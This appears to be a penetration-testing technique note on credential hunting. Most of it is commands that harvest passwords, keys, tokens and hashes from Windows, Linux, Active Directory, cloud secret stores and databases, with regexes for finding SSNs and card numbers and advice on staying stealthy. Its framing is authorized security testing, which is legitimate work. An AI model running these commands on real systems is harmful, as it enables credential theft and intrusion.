---
tags:
  - type/technique
  - tactic/credential-access
  - tactic/collection
  - technique/data-pillaging
  - technique/credential-hunting
  - tool/snaffler
  - tool/lazagne
  - tool/seatbelt
  - tool/grep
  - tool/findstr
---

# Data Pillaging & Credential Hunting

## Introduction

Data pillaging focuses on locating, retrieving, and extracting credentials (passwords, hashes, tokens, keys) and sensitive data from accessible sources on compromised hosts, networks, or cloud environments. This excludes credential dumping techniques that require code execution, such as memory scraping or SAM hive extraction. Instead, it emphasizes searching files, configurations, databases, and shares for sensitive data.

## Automated Tools

### Snaffler
A powerful tool for identifying and capturing credentials and sensitive data from network shares.

```powershell
# Basic execution - spiders all shares in a domain
Snaffler.exe -s -d domain.local -o snaffler.log -v data

# Target specific computer with domain credentials
Snaffler.exe -s -n targetcomputer.domain.local -d domain.local -u username -p password -o results.log

# Run from a domain-joined computer without credentials
Snaffler.exe -s -o results.log
```

### LaZagne
Retrieves passwords stored in commonly used software.

```powershell
# Run all modules
laZagne.exe all

# Save output to a specific location
laZagne.exe all -output C:\Windows\Tasks

# Decrypt domain credentials (requires current user's password)
laZagne.exe all -password <CURRENT_USER_PASSWORD>
```

### Seatbelt
Performs security-oriented host surveys that can uncover credentials.

```powershell
# Run all checks
Seatbelt.exe -group=all -outputfile="C:\Windows\Tasks\all.txt"

# Run credential-specific checks
Seatbelt.exe -group=user -outputfile="C:\Windows\Tasks\creds.txt"
```

### DefaultCreds-Cheat-Sheet
CLI tool with database of default credentials for various applications:

```bash
# Install
pip3 install defaultcreds-cheat-sheet --break-system-packages

# Search for default credentials
creds search tomcat
creds search jenkins
```

## Windows Credential Hunting

### File System Searches
```powershell
# Search for credentials in common file types
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# Search recursively through specific directories
findstr /S /I /M "password" C:\Users\*\Documents\*.txt C:\inetpub\*.config

# Search for connection strings in web configs
findstr /S /I /M "connectionString" C:\inetpub\*.config
```

### Group Policy Preferences (GPP) Passwords
GPP passwords are stored in XML files in the SYSVOL share.

```bash
# Using Impacket without credentials
impacket-Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'

# With credentials
impacket-Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

# Using NetExec
nxc smb 172.16.5.5 -u 'user' -p 'pass' -M gpp_autologin

# Decrypt discovered cpassword
gpp-decrypt "<cpassword_value>"
```

### Passwords in AD Description Fields
```powershell
# Using PowerView
Import-Module PowerView.ps1
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}

# Using NetExec
nxc ldap <hostname> -u <user> -p <pass> -M get-desc-users
```

### Application Configuration Files
- **IIS Web.config**: `C:\inetpub\wwwroot\web.config` and subdirectories
- **Unattend.xml**: Installation directories, `C:\Windows\Panther\`, `C:\Windows\System32\sysprep\`
- **KeePass databases**: Search for `.kdbx` files in user directories
- **WinSCP configuration**: `%APPDATA%\WinSCP.ini` or registry
- **RDP credentials**: Saved RDP connections in `.rdp` files
- **Software configuration files**: `.ini`, `.xml`, `.config` in application directories

### Registry Locations
```powershell
# Auto-logon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# PuTTY saved sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# SNMP community strings
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities"

# VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password
```

### PowerShell History
```powershell
# Read PowerShell history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Search for sensitive commands
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | findstr /i password
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | findstr /i secret
```

### Browser Data
- **Firefox**: `%APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json`
- **Chrome**: `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`
- **Edge**: `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data`
- **Saved form data**: Look for autofill databases and cookies for active sessions

### Script and Code Repositories
- **Local Git repositories**: Check `.git-credentials` files
- **Visual Studio projects**: Look for `app.config`, `web.config` with connection strings
- **PowerShell scripts**: Scan for `$password`, `$credential`, `ConvertTo-SecureString`
- **Batch files**: Look for credentials passed as parameters

### Service Account Details
```powershell
# List services with configuration details
Get-WmiObject win32_service | Select-Object Name, StartName, PathName | Where-Object {$_.StartName -ne "LocalSystem"}

# Check for non-standard service accounts
wmic service get name,startname | findstr /v "LocalSystem NetworkService LocalService"
```

### Scheduled Tasks
```powershell
# List all scheduled tasks
schtasks /query /fo LIST /v | findstr /i "TASK_NAME USERNAME COMMAND"

# Examine XML files directly
type C:\Windows\System32\Tasks\*.job | findstr /i password
```

## Linux Credential Hunting

### File System Searches
```bash
# Search for passwords in configuration files
grep -ir "password" /etc 2>/dev/null
grep -ir "passwd" /home 2>/dev/null

# Search for database credentials
find / -type f -name "*.conf" -exec grep -l "DB_USER\|DB_PASS\|database_password" {} \; 2>/dev/null
find / -type f -name "*.yaml" -exec grep -l "password\|secret\|key" {} \; 2>/dev/null

# Look for SSH keys
find / -type f -name "id_rsa" -o -name "id_dsa" 2>/dev/null
find /home -type f -name "authorized_keys" -o -name "known_hosts" 2>/dev/null

# Search for private keys
find / -type f -name "*.pem" -o -name "*.key" -o -name "*.pfx" -o -name "*.p12" 2>/dev/null

# Look for environment files
grep -r "export" /etc/profile /etc/bashrc /etc/environment /home/*/.bashrc /home/*/.bash_profile 2>/dev/null
```

### Git Repositories
```bash
# Look for git credentials
find /home -type f -name ".git-credentials" -o -name ".gitconfig" 2>/dev/null
find / -type f -path "*.git/config" -exec grep -l "url" {} \; 2>/dev/null

# Check git logs for secrets
find / -type d -name ".git" -exec bash -c "cd {}/../ && git log -p | grep -i password" \; 2>/dev/null
```

### Cloud Credentials
```bash
# AWS credentials
find /home -type f -path "*/.aws/credentials" 2>/dev/null
find / -type f -path "*aws*" -exec grep -l "aws_access_key_id\|aws_secret_access_key" {} \; 2>/dev/null

# Azure credentials
find / -type f -name "*.json" -exec grep -l "appId\|password\|tenant" {} \; 2>/dev/null

# Google Cloud
find / -type f -name "application_default_credentials.json" -o -name "credentials.json" 2>/dev/null
```

### Web Application Files
```bash
# PHP files with database connections
grep -r "mysqli_connect\|mysql_connect" /var/www/ 2>/dev/null

# Python Django settings
find / -name "settings.py" -exec grep -l "PASSWORD" {} \; 2>/dev/null

# Rails database configuration
find / -name "database.yml" 2>/dev/null
```

### Log Files
```bash
# Check authentication logs
grep -i "successful\|accepted\|login\|user" /var/log/auth.log 2>/dev/null
grep -i "fail\|invalid\|error" /var/log/auth.log 2>/dev/null

# Web server logs that might contain credentials in URLs
grep -r "pass=\|pwd=\|password=\|user=\|username=\|auth" /var/log/ 2>/dev/null
```

### Database Files
```bash
# SQLite databases
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null

# MySQL history files
find /home -name ".mysql_history" 2>/dev/null

# PostgreSQL connection files
find /home -path "*/.psql_history" -o -path "*/pgpass" 2>/dev/null
```

## Network & Active Directory Pillaging

### SYSVOL Enumeration
```powershell
# Map SYSVOL as a drive (if authenticated)
net use Z: \\domain.local\SYSVOL

# Search all policies
dir /s /b Z:\domain.local\Policies\*.xml
findstr /S /I /M "cpassword" Z:\domain.local\Policies\*.xml
```

### SMB Share Enumeration
```powershell
# Using PowerView
Import-Module PowerView.ps1
Find-DomainShare -CheckShareAccess | Select-Object Name, Path, Remark, ComputerName

# Manual search for interesting files
dir /s /b "\\server\share\password*.*"
dir /s /b "\\server\share\*.kdbx"
dir /s /b "\\server\share\*.config"
```

### Kerberos Tickets and Service Accounts
```powershell
# Using PowerView to find service accounts
Get-DomainUser -SPN | Select-Object SamAccountName, ServicePrincipalName

# Look for Kerberos delegation
Get-DomainComputer -TrustedToAuth | Select-Object -ExpandProperty dnshostname
```

### Interesting Shares and Repositories
- **IT department shares**: Often contain scripts with hardcoded credentials
- **Developer shares**: May have source code with API keys or connection strings
- **Backup directories**: Can contain database dumps or configuration backups
- **Documentation shares**: May include password spreadsheets or system documentation
- **DFS shares**: Distributed shares that might have different access controls

## Cloud Environment Pillaging

### AWS
```bash
# List S3 buckets
aws s3 ls

# Check for accessible secret material
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <SECRET_ID>

# Enumerate IAM information
aws iam generate-credential-report
aws iam get-credential-report
aws iam get-account-authorization-details

# Check Lambda functions for hardcoded secrets
aws lambda list-functions
aws lambda get-function --function-name <FUNCTION_NAME>
```

### Azure
```bash
# List storage accounts
az storage account list

# List Key Vault secrets (if access allows)
az keyvault list
az keyvault secret list --vault-name <VAULT_NAME>

# Check App Service configuration
az webapp config appsettings list --name <APP_NAME> --resource-group <RESOURCE_GROUP>
```

### Google Cloud
```bash
# List storage buckets
gsutil ls

# List Secret Manager secrets
gcloud secrets list
gcloud secrets versions access latest --secret=<SECRET_NAME>

# Check service accounts
gcloud iam service-accounts list
```

## Database Access

### MySQL
```bash
# If you have access to mysql client with existing credentials
mysql -u root -p -e "SELECT User, Host, Password FROM mysql.user"
mysql -u root -p -e "SHOW DATABASES; USE wordpress; SELECT user_login, user_pass FROM wp_users"
```

### MSSQL
```powershell
# Using PowerUpSQL (if already have access)
Get-SQLInstanceLocal | Get-SQLConnectionTest
Get-SQLQuery -Instance "Server\Instance" -Query "SELECT name, password_hash FROM master.sys.sql_logins"
```

### PostgreSQL
```bash
# If you have psql access
psql -U postgres -c "SELECT usename, passwd FROM pg_shadow"
```

## Sensitive Data Hunting

### Personally Identifiable Information (PII)
```bash
# Find Social Security Numbers
grep -r "[0-9]\{3\}-[0-9]\{2\}-[0-9]\{4\}" /path/to/search

# Find email addresses
grep -r -E "\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\\b" /path/to/search

# Find credit card numbers
grep -r -E "[0-9]{13,16}" /path/to/search | grep -v -E "[0-9]{17,}"
```

### Business-Critical Information
- **Financial reports**: Look for quarterly/annual reports
- **Strategic documents**: Search for "confidential", "internal only", "strategic plan"
- **Product development**: Search for "roadmap", "unreleased", "prototype"
- **Employee data**: HR databases, salary information, performance reviews
- **Customer data**: CRM databases, contact lists, sales pipelines

### Health Information
- **Patient records**: Look for PHI/HIPAA-protected information
- **Medical history**: Search for diagnostic codes, treatment plans
- **Insurance information**: Policy numbers, claims data

## Best Practices for Data Pillaging

1. **Prioritize targets**: Focus on high-value sources first (IT admin shares, configuration files)
2. **Document findings**: Keep detailed records of what was accessed and where
3. **Minimize footprint**: Avoid writing to disk when possible
4. **Respect scope**: Stay within the boundaries of authorized testing
5. **Secure extracted data**: Encrypt and protect any sensitive information collected
6. **Use stealthy techniques**: Minimize noise and avoid triggering alerts
7. **Report findings responsibly**: Document all discovered credentials for remediation

## Additional Tools and Techniques

- **CrackMapExec**: For network share enumeration and pillaging
- **EyeWitness**: For visual reconnaissance of web interfaces that might expose credentials
- **Empire/PowerShell**: For executing pillaging modules in memory
- **Metasploit**: Offers various post-exploitation modules for credential harvesting
- **BloodHound**: For visualizing AD relationships that might reveal credential access paths
